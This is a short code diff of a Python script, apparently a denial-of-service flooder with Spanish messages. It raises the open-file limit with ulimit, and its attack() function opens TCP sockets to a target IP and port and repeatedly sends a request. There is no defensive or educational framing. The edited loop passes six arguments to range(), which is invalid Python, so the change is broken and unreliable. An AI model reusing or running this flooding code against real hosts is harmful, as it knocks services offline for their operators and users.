@@ -11,7 +11,7 @@ print("Sistema detectado: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 20030000")
+    os.system("ulimit -n 130000")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -35,7 +35,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(80,8080,443,111,55,23):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
